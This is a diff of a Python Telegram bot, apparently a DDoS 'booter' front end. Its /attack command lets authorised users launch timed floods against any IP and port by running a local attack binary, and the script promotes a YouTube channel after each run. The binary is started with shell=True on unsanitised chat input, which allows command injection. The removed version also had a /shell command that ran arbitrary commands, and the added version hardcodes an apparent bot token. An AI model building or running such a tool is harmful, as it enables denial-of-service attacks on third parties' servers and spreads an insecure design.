@@ -1,168 +1,129 @@
-#!/usr/bin/python3
 import telebot
 import time
-import threading
 import subprocess
+import random
+from threading import Timer
 
-# Telegram bot token
-bot = telebot.TeleBot('YOUR_BOT_TOKEN')
+# Bot token and admin information
+BOT_TOKEN = '7228305815:AAGZvYtuYd6BC1J1qYeneQFPzDa4XDW5tYQ'
+ADMIN_ID = 1232047106
+OWNER_NAME = '@OWNERSRK'
+CHANNEL_LINK = 'https://youtube.com/@zeroflexislive?si=zRItV1qSr1cGoEqX'
 
-# Admin user IDs
-admin_id = ["1232047106"]
+# Initialize the bot
+bot = telebot.TeleBot(BOT_TOKEN)
 
-# Authorized users (Initially empty, you can add via /add)
-authorized_users = []
+# User management
+authorized_users = set([ADMIN_ID])
+cooldown_users = {}
 
-# Cooldown tracker
-user_cooldowns = {}
+# Fun messages
+welcome_messages = [
+    f"Yo! Main hoon {OWNER_NAME} ka secret agent. Kya haal hai?",
+    f"Bhai! {OWNER_NAME} ka bot bol raha hoon. Ready ho sab kuch hilane ke liye?",
+    f"Aaja bhai! {OWNER_NAME} ke bot ki duniya me, idhar sirf mazedari chalegi!"
+]
 
-# Maximum duration and cooldown time
-MAX_DURATION = 180
-COOLDOWN_TIME = 30
+attack_start_messages = [
+    "Attack ka dhamaka hone wala hai! 💥",
+    "Goli chali! Attack start! 🚀",
+    "Yeh lo! Attack start! 🎯",
+    "Hawa me barood ki boo hai... Attack shuru! 🧨"
+]
 
-# YouTube Channel Promotion
-YT_PROMO = "🚀 Don't forget to subscribe to our YouTube Channel: [SRK](https://www.youtube.com/@SRK) for more updates!"
+cooldown_messages = [
+    "Bhai! Pichli machine abhi bhi dhuaan chhod rahi hai! 🛠️",
+    "Thoda intezaar kar bhai! Server ko saans lene de. 🧊",
+    "Bhai chill! Attack cool down mode me hai. ☕",
+    "Sabra ka phal meetha hota hai, bas kuch hi sec me ready! ⏳"
+]
 
-# Command to simulate attack execution
-def execute_attack(target, port, duration):
-    time.sleep(duration)
-    return f"🏁 Attack on {target}:{port} finished after {duration} seconds! 🎉\n\n{YT_PROMO}"
+attack_complete_messages = [
+    "Boss! Attack finish! Ab channel pe chalo: ",
+    "Bhai! Mission complete! Ab apni community join karo: ",
+    "Hogaya kaam! Ab YouTube pe milo: ",
+    "Target done! Ab apna channel support karo: "
+]
 
-# Command to execute shell commands asynchronously
-def execute_shell_command(command):
-    try:
-        # Run the command asynchronously
-        process = subprocess.Popen(command, shell=True)
-        return process
-    except Exception as e:
-        return f"Error executing command: {str(e)}"
+easter_eggs = [
+    "Bhai! Secret baat bataun? Main sirf ek bot hoon... 😉",
+    "Acha suna? Jo log /start karte hain, unke naseeb badal jate hain! 🌟",
+    "Psst! Agar tum /attack use karte ho, toh tum bohot cool ho! 😎"
+]
 
-# Start Command
+# Welcome message on /start
 @bot.message_handler(commands=['start'])
 def start(message):
-    if str(message.from_user.id) in admin_id:
-        bot.reply_to(message, "Welcome Admin! Type /attack to launch an attack.")
-    else:
-        bot.reply_to(message, "You are not authorized to use this bot.")
+    response = random.choice(welcome_messages)
+    if random.randint(1, 10) > 8:  # 20% chance of Easter egg
+        response += "\n" + random.choice(easter_eggs)
+    bot.reply_to(message, response)
 
-# Attack Command
-@bot.message_handler(commands=['attack'])
-def attack(message):
-    if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "❌ You are not authorized to use this command.")
-        return
-
-    args = message.text.split()[1:]
-    if len(args) != 3:
-        bot.reply_to(message, "❌ Invalid format! Use /attack [target] [port] [duration].")
-        return
-
-    target, port, duration = args
-    try:
-        duration = int(duration)
-        if duration > MAX_DURATION:
-            bot.reply_to(message, f"❌ Duration too long! Maximum allowed is {MAX_DURATION} seconds.")
-            return
-    except ValueError:
-        bot.reply_to(message, "❌ Duration must be a number.")
-        return
-
-    user_id = message.from_user.id
-    if user_id in user_cooldowns:
-        remaining_time = round(user_cooldowns[user_id] - time.time())
-        if remaining_time > 0:
-            bot.reply_to(message, f"⏳ Please wait {remaining_time} seconds before starting a new attack.")
-            return
-
-    bot.reply_to(message, f"🔨 Hacking {target} into oblivion!\n\n🎯 **Target:** {target}\n📜 **Port:** {port}\n⏰ **Duration:** {duration} sec")
-
-    # Start the attack in a new thread
-    threading.Thread(target=start_attack, args=(message, target, port, duration)).start()
-
-    # Set cooldown for the user
-    user_cooldowns[user_id] = time.time() + COOLDOWN_TIME
-
-def start_attack(message, target, port, duration):
-    # Command to execute shell attack
-    full_command = f"./Moin {target} {port} {duration}"
-    process = execute_shell_command(full_command)
-    
-    if process:
-        bot.reply_to(message, f"✅ Attack started: `{full_command}`", parse_mode="Markdown")
-    else:
-        bot.reply_to(message, "❌ Error starting the attack.")
-
-# Add User Command
+# Add user command (Admin only)
 @bot.message_handler(commands=['add'])
 def add_user(message):
-    if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "❌ You are not authorized to use this command.")
-        return
-
-    args = message.text.split()[1:]
-    if len(args) != 1:
-        bot.reply_to(message, "❌ Invalid format! Use /add [user_id].")
-        return
-
-    user_id = args[0]
-    if user_id not in authorized_users:
-        authorized_users.append(user_id)
-        bot.reply_to(message, f"✅ User {user_id} has been added successfully.")
+    if message.from_user.id == ADMIN_ID:
+        try:
+            user_id = int(message.text.split()[1])
+            authorized_users.add(user_id)
+            bot.reply_to(message, f"User {user_id} ko hamari gang me shamil kar liya! ✅")
+        except (IndexError, ValueError):
+            bot.reply_to(message, "Bhai sahi ID bhejo na! 🤨")
     else:
-        bot.reply_to(message, f"❌ User {user_id} is already authorized.")
+        bot.reply_to(message, "Sirf boss (admin) hi naye bande add kar sakte hain! 🚫")
 
-# Remove User Command
+# Remove user command (Admin only)
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
-    if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "❌ You are not authorized to use this command.")
-        return
-
-    args = message.text.split()[1:]
-    if len(args) != 1:
-        bot.reply_to(message, "❌ Invalid format! Use /remove [user_id].")
-        return
-
-    user_id = args[0]
-    if user_id in authorized_users:
-        authorized_users.remove(user_id)
-        bot.reply_to(message, f"✅ User {user_id} has been removed successfully.")
+    if message.from_user.id == ADMIN_ID:
+        try:
+            user_id = int(message.text.split()[1])
+            authorized_users.discard(user_id)
+            bot.reply_to(message, f"User {user_id} ko gang se nikaal diya! ❌")
+        except (IndexError, ValueError):
+            bot.reply_to(message, "Sahi ID bhejo, aise kaise chalega! 🧐")
     else:
-        bot.reply_to(message, f"❌ User {user_id} is not authorized.")
+        bot.reply_to(message, "Bhai! Tumhe ye power nahi hai! 🔐")
 
-# Binary Access Shell Command
-@bot.message_handler(commands=['shell'])
-def shell(message):
-    if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "❌ You are not authorized to use this command.")
+# Attack command with binary execution and cooldown
+@bot.message_handler(commands=['attack'])
+def attack(message):
+    user_id = message.from_user.id
+    if user_id not in authorized_users:
+        bot.reply_to(message, "Are bhai! Tumhe toh permission nahi hai! 🚫")
+        return
+    
+    if user_id in cooldown_users and time.time() < cooldown_users[user_id]:
+        cooldown_time = int(cooldown_users[user_id] - time.time())
+        bot.reply_to(message, f"{random.choice(cooldown_messages)} ({cooldown_time} sec left)")
         return
 
-    args = message.text.split()[1:]
-    if len(args) == 0:
-        bot.reply_to(message, "❌ Invalid format! Use /shell [command].")
-        return
+    try:
+        _, ip, port, duration = message.text.split()
+        duration = min(int(duration), 180)
 
-    command = " ".join(args)
-    result = execute_shell_command(command)
-    bot.reply_to(message, f"🖥️ Shell command output:\n{result}")
+        # Command to run the attack binary with required parameters
+        command = f"./LEGEND {ip} {port} {duration}"
 
-# Help Command
-@bot.message_handler(commands=['help'])
-def help(message):
-    bot.reply_to(message, """
-Here are the available commands:
+        try:
+            # Execute the binary with subprocess
+            subprocess.Popen(command, shell=True)
+            bot.reply_to(message, f"{random.choice(attack_start_messages)} Target: {ip}:{port} for {duration} sec.")
 
-/start - Start the bot
-/attack [target] [port] [duration] - Simulate an attack
-/add [user_id] - Add a user to the authorized list
-/remove [user_id] - Remove a user from the authorized list
-/shell [command] - Execute a shell command (admin only)
-/help - Show this help message
+            # Set cooldown and timer for promotion message
+            cooldown_users[user_id] = time.time() + 60
 
-Owner: @OWNERSRK
-    """)
+            def end_attack():
+                bot.send_message(message.chat.id, f"{random.choice(attack_complete_messages)} {CHANNEL_LINK}")
 
-# Run the bot
-print("Bot is running...")
-bot.polling()
-        
+            Timer(duration, end_attack).start()
+
+        except Exception as e:
+            bot.reply_to(message, f"Kuch gadbad ho gayi: {e} 😵")
+
+    except (IndexError, ValueError):
+        bot.reply_to(message, "Bhai! Format sahi bhejo: /attack <ip> <port> <time> (Max 180 sec) ⚠️")
+
+# Start the bot
+print("Bot is running... 🚀")
+bot.infinity_polling()
